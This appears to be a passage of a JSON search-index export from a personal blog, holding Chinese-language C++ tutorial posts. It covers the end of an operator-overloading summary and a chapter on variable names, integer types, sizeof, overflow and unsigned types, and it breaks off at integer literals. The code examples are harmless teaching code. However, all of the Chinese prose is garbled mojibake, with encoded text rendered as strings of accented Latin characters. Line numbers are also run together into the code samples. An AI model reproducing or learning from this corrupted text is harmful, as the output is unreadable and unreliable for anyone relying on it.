.ã€::ã€sizeofï¼‰ä¸èƒ½è¢«é‡è½½ã€‚ Time ç±»çš„ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•é‡è½½ +, -, * ç­‰ç®—æœ¯è¿ç®—ç¬¦ã€‚ å‹å…ƒ (Friends): å…è®¸éæˆå‘˜å‡½æ•°æˆ–æ•´ä¸ªç±»è®¿é—®å¦ä¸€ä¸ªç±»çš„ private å’Œ protected æˆå‘˜ã€‚ é€šè¿‡åœ¨ç±»å®šä¹‰å†…éƒ¨ä½¿ç”¨ friend å…³é”®å­—å£°æ˜ã€‚ å‹å…ƒå‡½æ•°å¸¸ç”¨äºé‡è½½é‚£äº›ä¸èƒ½ä½œä¸ºæˆå‘˜å‡½æ•°ï¼ˆå¦‚ &lt;&lt;, &gt;&gt;ï¼‰æˆ–éœ€è¦å¯¹ç§°å¤„ç†æ“ä½œæ•°ï¼ˆå¦‚ double * Vectorï¼‰çš„è¿ç®—ç¬¦ã€‚ å‹å…ƒç±»å…è®¸ä¸€ä¸ªç±»çš„æ‰€æœ‰æˆå‘˜å‡½æ•°è®¿é—®å¦ä¸€ä¸ªç±»çš„ç§æœ‰éƒ¨åˆ†ï¼Œé€‚ç”¨äºéœ€è¦ç´§å¯†åä½œçš„ç±»ã€‚ æˆå‘˜å‡½æ•° vs. éæˆå‘˜å‡½æ•° (Operator Overloading Choice): èµ‹å€¼ (=)ã€ä¸‹æ ‡ ([])ã€å‡½æ•°è°ƒç”¨ (())ã€æˆå‘˜è®¿é—® (-&gt;) è¿ç®—ç¬¦å¿…é¡»æ˜¯æˆå‘˜å‡½æ•°ã€‚ ä¿®æ”¹å¯¹è±¡çŠ¶æ€çš„è¿ç®—ç¬¦ï¼ˆå¦‚ +=, ++ï¼‰é€šå¸¸å®ç°ä¸ºæˆå‘˜å‡½æ•°ã€‚ éœ€è¦å¯¹ç§°æ€§æˆ–å…è®¸å·¦æ“ä½œæ•°è¿›è¡Œç±»å‹è½¬æ¢çš„è¿ç®—ç¬¦ï¼ˆå¦‚ +, *, ==ï¼‰ä»¥åŠè¾“å…¥/è¾“å‡ºè¿ç®—ç¬¦ (&lt;&lt;, &gt;&gt;) é€šå¸¸å®ç°ä¸ºéæˆå‘˜å‹å…ƒå‡½æ•°ã€‚ Vector ç±»ç¤ºä¾‹: æ¼”ç¤ºäº†å¦‚ä½•è®¾è®¡ä¸€ä¸ªåŒ…å«çŠ¶æ€ï¼ˆç›´è§’/æåæ ‡æ¨¡å¼ï¼‰çš„ç±»ã€‚ è¿›ä¸€æ­¥å±•ç¤ºäº†ç®—æœ¯è¿ç®—ç¬¦ (+, -, unary -, *) å’Œè¾“å‡ºè¿ç®—ç¬¦ (&lt;&lt;) çš„é‡è½½ã€‚ é€šè¿‡éšæœºæ¼«æ­¥æ¨¡æ‹Ÿå±•ç¤ºäº† Vector ç±»çš„å®é™…åº”ç”¨ã€‚ ç±»çš„ç±»å‹è½¬æ¢: æ„é€ å‡½æ•°è½¬æ¢: æ¥å—å•ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°ï¼ˆé™¤éå£°æ˜ä¸º explicitï¼‰å®šä¹‰äº†ä»å‚æ•°ç±»å‹åˆ°ç±»ç±»å‹çš„éšå¼è½¬æ¢ã€‚ è½¬æ¢å‡½æ•°: operator typeName() å½¢å¼çš„æˆå‘˜å‡½æ•°ï¼ˆé™¤éå£°æ˜ä¸º explicitï¼‰å®šä¹‰äº†ä»ç±»ç±»å‹åˆ° typeName ç±»å‹çš„éšå¼è½¬æ¢ã€‚ explicit å…³é”®å­—: ç”¨äºé˜»æ­¢æ„é€ å‡½æ•°å’Œè½¬æ¢å‡½æ•°è¿›è¡Œéšå¼è½¬æ¢ï¼Œæé«˜ä»£ç å®‰å…¨æ€§ï¼Œé¿å…æ„å¤–è½¬æ¢å’ŒäºŒä¹‰æ€§ã€‚ äºŒä¹‰æ€§: å½“å­˜åœ¨å¤šä¸ªè½¬æ¢è·¯å¾„ï¼ˆé€šè¿‡æ„é€ å‡½æ•°æˆ–è½¬æ¢å‡½æ•°ï¼‰æ—¶ï¼Œå¯èƒ½å¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚åº”è°¨æ…è®¾è®¡è½¬æ¢è§„åˆ™æˆ–ä½¿ç”¨ explicitã€‚ é€šè¿‡åˆç†è¿ç”¨è¿ç®—ç¬¦é‡è½½ã€å‹å…ƒå’Œç±»å‹è½¬æ¢ï¼Œå¯ä»¥åˆ›å»ºå‡ºåŠŸèƒ½ä¸°å¯Œã€æ˜“äºä½¿ç”¨ä¸”è¡¨è¾¾åŠ›å¼ºçš„ C++ ç±»ã€‚ç„¶è€Œï¼Œè¿™äº›ç‰¹æ€§ä¹Ÿéœ€è¦è°¨æ…ä½¿ç”¨ï¼Œä»¥é¿å…å¼•å…¥ä¸å¿…è¦çš„å¤æ‚æ€§æˆ–æ½œåœ¨çš„é”™è¯¯ã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 3 å¤„ç†æ•°æ®","slug":"Cpp_tutorial_Chapter_3","date":"2025-04-26T12:03:35.410Z","updated":"2025-04-26T12:01:21.849Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_3/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_3/","excerpt":"","text":"3.1 ç®€å•å˜é‡åœ¨ç¬¬2ç« ä¸­ï¼Œæˆ‘ä»¬å·²ç»æ¥è§¦äº†å˜é‡çš„å£°æ˜å’Œä½¿ç”¨ã€‚æœ¬ç« å°†æ·±å…¥æ¢è®¨C++çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼Œé¦–å…ˆä»ç”¨äºå­˜å‚¨æ•°å­—å’Œå­—ç¬¦çš„ç®€å•å˜é‡å¼€å§‹ã€‚ç®€å•å˜é‡æ˜¯C++ä¸­å­˜å‚¨æ•°æ®çš„åŸºæœ¬å•å…ƒã€‚ 3.1.1 å˜é‡åå˜é‡åæ˜¯èµ‹äºˆå†…å­˜ä½ç½®çš„æ ‡è¯†ç¬¦ï¼Œç”¨äºè®¿é—®å­˜å‚¨åœ¨è¯¥ä½ç½®çš„æ•°æ®ã€‚åœ¨C++ä¸­ï¼Œé€‰æ‹©æœ‰æ„ä¹‰çš„å˜é‡åæ˜¯è‰¯å¥½ç¼–ç¨‹å®è·µçš„ä¸€éƒ¨åˆ†ã€‚ å‘½åè§„åˆ™: å­—ç¬¦é›†: å˜é‡ååªèƒ½åŒ…å«å­—æ¯ï¼ˆå¤§å°å†™ï¼‰ã€æ•°å­—å’Œä¸‹åˆ’çº¿ _ã€‚ é¦–å­—ç¬¦: åç§°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½æ˜¯æ•°å­—ã€‚ åŒºåˆ†å¤§å°å†™: C++æ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼ŒmyVariable å’Œ myvariable æ˜¯ä¸¤ä¸ªä¸åŒçš„å˜é‡åã€‚ ä¸èƒ½æ˜¯å…³é”®å­—: ä¸èƒ½ä½¿ç”¨C++å…³é”®å­—ï¼ˆå¦‚ int, double, return, if, class ç­‰ï¼‰ä½œä¸ºå˜é‡åã€‚ é•¿åº¦é™åˆ¶: C++å¯¹åç§°çš„é•¿åº¦æ²¡æœ‰ç¡¬æ€§è§„å®šï¼Œä½†é•¿åç§°å¯èƒ½ä¼šåœ¨æŸäº›æ—§ç¼–è¯‘å™¨æˆ–é“¾æ¥å™¨ä¸Šé‡åˆ°é—®é¢˜ã€‚é€šå¸¸ï¼Œæœ‰æ„ä¹‰ä¸”ä¸è¿‡äºå†—é•¿çš„åç§°æ˜¯æœ€å¥½çš„ã€‚ ä¸‹åˆ’çº¿çš„ä½¿ç”¨: ä»¥ä¸¤ä¸ªä¸‹åˆ’çº¿ __ å¼€å¤´æˆ–ä»¥ä¸‹åˆ’çº¿å’Œå¤§å†™å­—æ¯ _A åˆ° _Z å¼€å¤´çš„åç§°è¢«ä¿ç•™ç»™ç¼–è¯‘å™¨åŠå…¶ä½¿ç”¨çš„èµ„æºä½¿ç”¨ã€‚ ä»¥ä¸‹åˆ’çº¿ _ å¼€å¤´çš„åç§°è¢«ä¿ç•™ç”¨ä½œå…¨å±€æ ‡è¯†ç¬¦ã€‚ è™½ç„¶åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨ä»¥ä¸‹åˆ’çº¿å¼€å¤´çš„åç§°ï¼ˆä¾‹å¦‚åœ¨å‡½æ•°å†…éƒ¨ï¼‰ï¼Œä½†æœ€å¥½é¿å…è¿™ç§ç”¨æ³•ï¼Œä»¥é˜²ä¸ç³»ç»Ÿä½¿ç”¨çš„åç§°å†²çªã€‚ å‘½åçº¦å®š (éå¼ºåˆ¶ï¼Œä½†æ¨è): æœ‰æ„ä¹‰: å˜é‡ååº”åæ˜ å…¶å­˜å‚¨çš„æ•°æ®æˆ–ç”¨é€”ï¼ˆä¾‹å¦‚ numberOfStudents, userName, totalScoreï¼‰ã€‚ é©¼å³°å‘½åæ³• (Camel Case): ä»ç¬¬äºŒä¸ªå•è¯å¼€å§‹ï¼Œæ¯ä¸ªå•è¯çš„é¦–å­—æ¯å¤§å†™ï¼ˆä¾‹å¦‚ myVariableName, studentAgeï¼‰ã€‚è¿™æ˜¯C++ä¸­å¸¸è§çš„é£æ ¼ã€‚ ä¸‹åˆ’çº¿åˆ†éš” (Snake Case): ä½¿ç”¨ä¸‹åˆ’çº¿åˆ†éš”å•è¯ï¼ˆä¾‹å¦‚ my_variable_name, student_ageï¼‰ã€‚è¿™ä¹Ÿæ˜¯ä¸€ç§å¸¸è§çš„é£æ ¼ã€‚ é€‰æ‹©ä¸€ç§é£æ ¼å¹¶ä¿æŒä¸€è‡´ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; // åˆæ³•çš„å˜é‡å int age; double accountBalance; char first_initial; long long populationOfEarth; int _internal_counter; // åˆæ³•ï¼Œä½†ä¸æ¨èåœ¨å…¨å±€ä½¿ç”¨ int value2; // éæ³•çš„å˜é‡å // int 1stPlace; // ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ // double account Balance; // ä¸èƒ½åŒ…å«ç©ºæ ¼ // int return; // ä¸èƒ½æ˜¯å…³é”®å­— // char my-char; // ä¸èƒ½åŒ…å«è¿å­—ç¬¦ &#x27;-&#x27; // åŒºåˆ†å¤§å°å†™ int count = 10; int Count = 20; std::cout &lt;&lt; &quot;count: &quot; &lt;&lt; count &lt;&lt; std::endl; // è¾“å‡º 10 std::cout &lt;&lt; &quot;Count: &quot; &lt;&lt; Count &lt;&lt; std::endl; // è¾“å‡º 20 return 0;&#125; 3.1.2 æ•´å‹æ•´å‹ (Integer) æ˜¯æ²¡æœ‰å°æ•°éƒ¨åˆ†çš„æ•°å­—ã€‚C++æä¾›äº†å¤šç§æ•´å‹ç±»å‹æ¥å­˜å‚¨æ•´æ•°ï¼Œå®ƒä»¬çš„ä¸»è¦åŒºåˆ«åœ¨äºå ç”¨çš„å†…å­˜ç©ºé—´å¤§å°ä»¥åŠèƒ½å¤Ÿè¡¨ç¤ºçš„æ•°å€¼èŒƒå›´ã€‚ è®¡ç®—æœºå†…å­˜ç”±ç§°ä¸ºä½ (bit) çš„å•å…ƒç»„æˆã€‚8ä¸ªä½ç»„æˆä¸€ä¸ª**å­—èŠ‚ (byte)**ã€‚æ¯ä¸ªä½å¯ä»¥è¡¨ç¤ºä¸¤ç§çŠ¶æ€ï¼ˆé€šå¸¸æ˜¯0æˆ–1ï¼‰ã€‚å­—èŠ‚æ˜¯å†…å­˜ä¸­æœ€å°çš„å¯å¯»å€å•å…ƒï¼Œæ„å‘³ç€æ¯ä¸ªå­—èŠ‚éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„åœ°å€ã€‚ ä¸åŒçš„æ•´å‹ç±»å‹ä½¿ç”¨ä¸åŒæ•°é‡çš„å­—èŠ‚æ¥å­˜å‚¨å€¼ã€‚ä½¿ç”¨çš„å­—èŠ‚æ•°è¶Šå¤šï¼Œå¯ä»¥è¡¨ç¤ºçš„æ•´æ•°èŒƒå›´å°±è¶Šå¤§ã€‚ åŸºæœ¬æ•´å‹ç±»å‹: short int long long long (C++11 æ–°å¢) æˆ‘ä»¬å°†åœ¨ä¸‹ä¸€èŠ‚è¯¦ç»†è®¨è®ºè¿™äº›ç±»å‹ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122#include &lt;iostream&gt;int main() &#123; // å£°æ˜ä¸åŒç±»å‹çš„æ•´å‹å˜é‡ short smallNumber; int standardInteger; long largeInteger; long long veryLargeInteger; // éœ€è¦ C++11 æˆ–æ›´é«˜ç‰ˆæœ¬ // èµ‹å€¼ smallNumber = 10; standardInteger = 10000; largeInteger = 1000000; veryLargeInteger = 10000000000LL; // LL åç¼€è¡¨ç¤º long long std::cout &lt;&lt; &quot;short: &quot; &lt;&lt; smallNumber &lt;&lt; std::endl; std::cout &lt;&lt; &quot;int: &quot; &lt;&lt; standardInteger &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long: &quot; &lt;&lt; largeInteger &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long long: &quot; &lt;&lt; veryLargeInteger &lt;&lt; std::endl; return 0;&#125; 3.1.3 æ•´å‹shortã€intã€longå’Œlong longC++æ ‡å‡†è§„å®šäº†å„ç§æ•´å‹ç±»å‹çš„æœ€å°å°ºå¯¸ï¼ˆå ç”¨çš„å†…å­˜ä½æ•°ï¼‰ï¼Œä½†å…·ä½“å°ºå¯¸å¯èƒ½å› ç¼–è¯‘å™¨å’Œæ“ä½œç³»ç»Ÿè€Œå¼‚ã€‚ æ ‡å‡†è§„å®šçš„æœ€å°å°ºå¯¸: short: è‡³å°‘16ä½ã€‚ int: è‡³å°‘å’Œ short ä¸€æ ·å¤§ï¼Œé€šå¸¸æ˜¯ç³»ç»Ÿå¤„ç†æ•ˆç‡æœ€é«˜çš„æ•´æ•°é•¿åº¦ï¼ˆä¾‹å¦‚ï¼Œåœ¨32ä½ç³»ç»Ÿä¸Šé€šå¸¸æ˜¯32ä½ï¼Œ64ä½ç³»ç»Ÿä¸Šå¯èƒ½æ˜¯32ä½æˆ–64ä½ï¼‰ã€‚ long: è‡³å°‘32ä½ï¼Œä¸”è‡³å°‘å’Œ int ä¸€æ ·å¤§ã€‚ long long: è‡³å°‘64ä½ï¼Œä¸”è‡³å°‘å’Œ long ä¸€æ ·å¤§ã€‚ å¦‚ä½•æŸ¥çœ‹å…·ä½“å°ºå¯¸: å¯ä»¥ä½¿ç”¨ sizeof è¿ç®—ç¬¦æ¥æŸ¥çœ‹ç‰¹å®šç±»å‹åœ¨ä½ çš„ç³»ç»Ÿä¸Šå ç”¨çš„å­—èŠ‚æ•°ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;climits&gt; // åŒ…å«æ•´å‹é™åˆ¶ä¿¡æ¯ (å¦‚ INT_MAX)int main() &#123; // ä½¿ç”¨ sizeof æŸ¥çœ‹å„ç§ç±»å‹å ç”¨çš„å­—èŠ‚æ•° std::cout &lt;&lt; &quot;Size of short: &quot; &lt;&lt; sizeof(short) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of int: &quot; &lt;&lt; sizeof(int) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of long: &quot; &lt;&lt; sizeof(long) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of long long: &quot; &lt;&lt; sizeof(long long) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // æŸ¥çœ‹ int ç±»å‹çš„æœ€å¤§å€¼ (éœ€è¦ &lt;climits&gt;) std::cout &lt;&lt; &quot;Maximum value for int: &quot; &lt;&lt; INT_MAX &lt;&lt; std::endl; // ç±»ä¼¼åœ°ï¼Œæœ‰ SHRT_MAX, LONG_MAX, LLONG_MAX ç­‰ // å£°æ˜å’Œåˆå§‹åŒ– short s_value = 32767; // é€šå¸¸æ˜¯ short çš„æœ€å¤§å€¼ (å¦‚æœ short æ˜¯ 16 ä½) int i_value = 2000000000; long l_value = 1000000000L; // L åç¼€è¡¨ç¤º long (å¯é€‰ï¼Œä½†æœ‰æ—¶æœ‰åŠ©äºæ¸…æ™°) long long ll_value = 50000000000LL; // LL åç¼€è¡¨ç¤º long long std::cout &lt;&lt; &quot;short value: &quot; &lt;&lt; s_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;int value: &quot; &lt;&lt; i_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long value: &quot; &lt;&lt; l_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long long value: &quot; &lt;&lt; ll_value &lt;&lt; std::endl; // æº¢å‡ºç¤ºä¾‹ (è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„æˆ–å›ç»•) short max_short = SHRT_MAX; std::cout &lt;&lt; &quot;Max short: &quot; &lt;&lt; max_short &lt;&lt; std::endl; max_short = max_short + 1; // å°è¯•è¶…å‡ºæœ€å¤§å€¼ std::cout &lt;&lt; &quot;Max short + 1: &quot; &lt;&lt; max_short &lt;&lt; std::endl; // å¯èƒ½å˜æˆè´Ÿæ•° return 0;&#125; æ³¨æ„: å½“ä¸€ä¸ªæ•´æ•°å€¼è¶…å‡ºäº†å…¶ç±»å‹æ‰€èƒ½è¡¨ç¤ºçš„æœ€å¤§èŒƒå›´æ—¶ï¼Œä¼šå‘ç”Ÿæº¢å‡º (Overflow)**ã€‚å¯¹äºæœ‰ç¬¦å·æ•´æ•°æº¢å‡ºï¼ŒC++æ ‡å‡†è§„å®šå…¶è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ (Undefined Behavior)**ï¼Œè¿™æ„å‘³ç€ä»»ä½•äº‹æƒ…éƒ½å¯èƒ½å‘ç”Ÿï¼ˆç¨‹åºå´©æºƒã€å¾—åˆ°å¥‡æ€ªçš„ç»“æœç­‰ï¼‰ã€‚å¯¹äºæ— ç¬¦å·æ•´æ•°æº¢å‡ºï¼Œè¡Œä¸ºæ˜¯å®šä¹‰å¥½çš„ï¼ˆé€šå¸¸æ˜¯å›ç»•ï¼Œå³ä»0é‡æ–°å¼€å§‹ï¼‰ã€‚ 3.1.4 æ— ç¬¦å·ç±»å‹å¯¹äºæ¯ç§æ•´å‹ï¼ˆshort, int, long, long longï¼‰ï¼Œéƒ½å­˜åœ¨ä¸€ä¸ªå¯¹åº”çš„æ— ç¬¦å· (unsigned) ç‰ˆæœ¬ã€‚æ— ç¬¦å·ç±»å‹åªèƒ½å­˜å‚¨éè´Ÿæ•´æ•°ï¼ˆ0å’Œæ­£æ•°ï¼‰ã€‚ é€šè¿‡åœ¨ç±»å‹åå‰åŠ ä¸Š unsigned å…³é”®å­—æ¥å£°æ˜æ— ç¬¦å·ç±»å‹ã€‚ ç‰¹ç‚¹: èŒƒå›´: åœ¨ç›¸åŒçš„å­—èŠ‚æ•°ä¸‹ï¼Œæ— ç¬¦å·ç±»å‹å¯ä»¥è¡¨ç¤ºçš„æœ€å¤§å€¼å¤§çº¦æ˜¯æœ‰ç¬¦å·ç±»å‹çš„ä¸¤å€ï¼Œå› ä¸ºå®ƒä»¬ä¸éœ€è¦ç”¨ä¸€ä½æ¥è¡¨ç¤ºæ­£è´Ÿå·ã€‚èŒƒå›´ä» 0 å¼€å§‹ã€‚ ç”¨é€”: å½“ä½ çŸ¥é“ä¸€ä¸ªå˜é‡æ°¸è¿œä¸ä¼šæ˜¯è´Ÿæ•°æ—¶ï¼ˆä¾‹å¦‚ï¼Œè®¡æ•°å™¨ã€æ•°ç»„ç´¢å¼•ã€äººå£æ•°é‡ç­‰ï¼‰ï¼Œä½¿ç”¨æ— ç¬¦å·ç±»å‹å¯ä»¥å¢å¤§å…¶å¯è¡¨ç¤ºçš„æ­£æ•°èŒƒå›´ã€‚ å›ç»• (Wrap Around): å½“æ— ç¬¦å·æ•´æ•°çš„å€¼è¶…å‡ºå…¶æœ€å¤§èŒƒå›´æ—¶ï¼Œå®ƒä¼šä»0é‡æ–°å¼€å§‹ï¼ˆæ¨¡è¿ç®—ï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ª unsigned short çš„æœ€å¤§å€¼æ˜¯ 65535ï¼Œé‚£ä¹ˆ 65535 + 1 ä¼šå˜æˆ 0ã€‚åŒæ ·ï¼Œ0 - 1 ä¼šå˜æˆ 65535ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &lt;climits&gt; // åŒ…å« UINT_MAX ç­‰int main() &#123; // å£°æ˜æ— ç¬¦å·ç±»å‹ unsigned short us_value; unsigned int ui_value; unsigned long ul_value; unsigned long long ull_value; // æŸ¥çœ‹å¤§å°å’ŒèŒƒå›´ std::cout &lt;&lt; &quot;Size of unsigned int: &quot; &lt;&lt; sizeof(unsigned int) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Maximum value for unsigned int: &quot; &lt;&lt; UINT_MAX &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // èµ‹å€¼ us_value = 65535; // é€šå¸¸æ˜¯ unsigned short çš„æœ€å¤§å€¼ (å¦‚æœ short æ˜¯ 16 ä½) ui_value = 4000000000U; // U åç¼€è¡¨ç¤º unsigned int ul_value = 8000000000UL; // UL åç¼€ ull_value = 18000000000000000000ULL; // ULL åç¼€ std::cout &lt;&lt; &quot;unsigned short: &quot; &lt;&lt; us_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;unsigned int: &quot; &lt;&lt; ui_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;unsigned long: &quot; &lt;&lt; ul_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;unsigned long long: &quot; &lt;&lt; ull_value &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // å›ç»•ç¤ºä¾‹ unsigned short test_wrap = USHRT_MAX; std::cout &lt;&lt; &quot;Max unsigned short: &quot; &lt;&lt; test_wrap &lt;&lt; std::endl; test_wrap = test_wrap + 1; std::cout &lt;&lt; &quot;Max unsigned short + 1: &quot; &lt;&lt; test_wrap &lt;&lt; std::endl; // å˜ä¸º 0 test_wrap = 0; std::cout &lt;&lt; &quot;Unsigned short = 0&quot; &lt;&lt; std::endl; test_wrap = test_wrap - 1; std::cout &lt;&lt; &quot;Unsigned short - 1: &quot; &lt;&lt; test_wrap &lt;&lt; std::endl; // å˜ä¸º USHRT_MAX return 0;&#125; æ³¨æ„: æ··åˆä½¿ç”¨æœ‰ç¬¦å·å’Œæ— ç¬¦å·æ•´æ•°è¿›è¡Œè¿ç®—æ—¶è¦ç‰¹åˆ«å°å¿ƒï¼Œå› ä¸ºæœ‰ç¬¦å·æ•°å¯èƒ½ä¼šè¢«éšå¼è½¬æ¢ä¸ºæ— ç¬¦å·æ•°ï¼Œå¯¼è‡´æ„å¤–çš„ç»“æœï¼Œå°¤å…¶æ˜¯åœ¨æ¯”è¾ƒè¿ç®—ä¸­ã€‚ 3.1.5 é€‰æ‹©æ•´å‹ç±»å‹åœ¨é€‰æ‹©ä½¿ç”¨å“ªç§æ•´å‹ç±»å‹æ—¶ï¼Œåº”è€ƒè™‘ä»¥ä¸‹å› ç´ ï¼š æ•°å€¼èŒƒå›´: ç¡®ä¿æ‰€é€‰ç±»å‹èƒ½å¤Ÿå®¹çº³ä½ ç¨‹åºä¸­éœ€è¦å­˜å‚¨çš„æœ€å¤§ï¼ˆå’Œæœ€å°ï¼Œå¦‚æœæ˜¯æœ‰ç¬¦å·ï¼‰æ•´æ•°å€¼ã€‚å¦‚æœæ•°å€¼å¯èƒ½å¾ˆå¤§ï¼Œä¼˜å…ˆè€ƒè™‘ long æˆ– long longã€‚å¦‚æœæ•°å€¼æ°¸è¿œéè´Ÿï¼Œå¯ä»¥è€ƒè™‘ unsigned ç‰ˆæœ¬ä»¥è·å¾—æ›´å¤§çš„æ­£æ•°èŒƒå›´ã€‚ å†…å­˜æ¶ˆè€—: å¦‚æœå†…å­˜éå¸¸å®è´µï¼ˆä¾‹å¦‚åœ¨åµŒå…¥å¼ç³»ç»Ÿæˆ–å¤„ç†å¤§é‡æ•°æ®æ—¶ï¼‰ï¼Œå¹¶ä¸”ç¡®å®šæ•°å€¼èŒƒå›´è¾ƒå°ï¼Œå¯ä»¥ä½¿ç”¨ short æ¥èŠ‚çœå†…å­˜ã€‚ æ€§èƒ½: int é€šå¸¸è¢«è®¤ä¸ºæ˜¯è®¡ç®—æœºå¤„ç†æ•ˆç‡æœ€é«˜çš„æ•´æ•°ç±»å‹ã€‚é™¤éæœ‰æ˜ç¡®çš„èŒƒå›´æˆ–å†…å­˜éœ€æ±‚ï¼Œå¦åˆ™ int æ˜¯ä¸€ä¸ªä¸é”™çš„é»˜è®¤é€‰æ‹©ã€‚ å¯ç§»æ¤æ€§: int çš„å¤§å°å¯èƒ½å› ç³»ç»Ÿè€Œå¼‚ã€‚å¦‚æœéœ€è¦ç¡®ä¿åœ¨ä¸åŒç³»ç»Ÿä¸Šå…·æœ‰å›ºå®šçš„å¤§å°ï¼Œå¯ä»¥ä½¿ç”¨ C++11 å¼•å…¥çš„å›ºå®šå®½åº¦æ•´æ•°ç±»å‹ï¼ˆåœ¨ &lt;cstdint&gt; å¤´æ–‡ä»¶ä¸­å®šä¹‰ï¼‰ï¼Œä¾‹å¦‚ int16_t, uint32_t, int64_t ç­‰ã€‚ ä»£ç æ¸…æ™°åº¦: é€‰æ‹©æœ€èƒ½è‡ªç„¶è¡¨è¾¾æ„å›¾çš„ç±»å‹ã€‚å¦‚æœå˜é‡ä»£è¡¨ä¸€ä¸ªæ°¸è¿œä¸ä¼šä¸ºè´Ÿçš„è®¡æ•°ï¼Œunsigned int å¯èƒ½æ¯” int æ›´èƒ½è¡¨è¾¾è¿™ä¸ªæ„å›¾ã€‚ ä¸€èˆ¬å»ºè®®: å¦‚æœä¸éœ€è¦å­˜å‚¨è´Ÿæ•°ï¼Œä¸”éœ€è¦æ›´å¤§çš„æ­£æ•°èŒƒå›´ï¼Œæˆ–è€…å˜é‡é€»è¾‘ä¸Šå°±æ˜¯æ— ç¬¦å·çš„ï¼ˆå¦‚è®¡æ•°ï¼‰ï¼Œä½¿ç”¨ unsignedã€‚ å¦‚æœæ•°å€¼èŒƒå›´ä¸å¤§ï¼Œä¸”æ²¡æœ‰ç‰¹æ®Šå†…å­˜æˆ–æ€§èƒ½è¦æ±‚ï¼Œint æ˜¯æœ€å¸¸ç”¨çš„é€‰æ‹©ã€‚ å¦‚æœ int å¯èƒ½ä¸å¤Ÿå¤§ï¼Œä½¿ç”¨ long longã€‚long åœ¨æŸäº›ç³»ç»Ÿä¸Šå¯èƒ½å’Œ int å¤§å°ç›¸åŒï¼Œè€Œ long long ä¿è¯è‡³å°‘64ä½ã€‚ åªæœ‰åœ¨å†…å­˜éå¸¸å—é™ä¸”ç¡®å®šæ•°å€¼å¾ˆå°æ—¶æ‰ä½¿ç”¨ shortã€‚ ä¸ºäº†æ˜ç¡®æ€§å’Œè·¨å¹³å°å…¼å®¹æ€§ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ &lt;cstdint&gt; ä¸­çš„å›ºå®šå®½åº¦ç±»å‹ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹ (é€‰æ‹©): 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;cstdint&gt; // åŒ…å«å›ºå®šå®½åº¦æ•´æ•°ç±»å‹int main() &#123; // åœºæ™¯ 1: å­˜å‚¨å­¦ç”Ÿå¹´é¾„ (é€šå¸¸ä¸å¤§ï¼Œéè´Ÿ) unsigned int studentAge = 20; // unsigned int æˆ– int éƒ½å¯ä»¥ï¼Œunsigned æ›´æ˜ç¡®éè´Ÿ // åœºæ™¯ 2: å¾ªç¯è®¡æ•°å™¨ (é€šå¸¸ç”¨ int) for (int i = 0; i &lt; 10; ++i) &#123; // ... &#125; // åœºæ™¯ 3: å­˜å‚¨æ–‡ä»¶å¤§å° (å¯èƒ½éå¸¸å¤§ï¼Œéè´Ÿ) unsigned long long fileSize = 5000000000ULL; // éœ€è¦å¤§èŒƒå›´ï¼Œéè´Ÿ // åœºæ™¯ 4: éœ€è¦ç²¾ç¡® 32 ä½æœ‰ç¬¦å·æ•´æ•° (è·¨å¹³å°) int32_t preciseCounter = -123456789; // åœºæ™¯ 5: å†…å­˜å—é™ï¼Œå­˜å‚¨å°‘é‡é€‰é¡¹ (0-100) // short optionCode = 5; // å¦‚æœ short è¶³å¤Ÿä¸”å†…å­˜å…³é”® std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; studentAge &lt;&lt; std::endl; std::cout &lt;&lt; &quot;File Size: &quot; &lt;&lt; fileSize &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Precise Counter: &quot; &lt;&lt; preciseCounter &lt;&lt; std::endl; return 0;&#125; 3.1.6 æ•´å‹å­—é¢å€¼æ•´å‹å­—é¢å€¼ (Integer Literal) æ˜¯ç›´æ¥å†™åœ¨ä»£ç ä¸­çš„æ•´æ•°å¸¸é‡ï¼Œä¾‹å¦‚ 10, 0, -5, 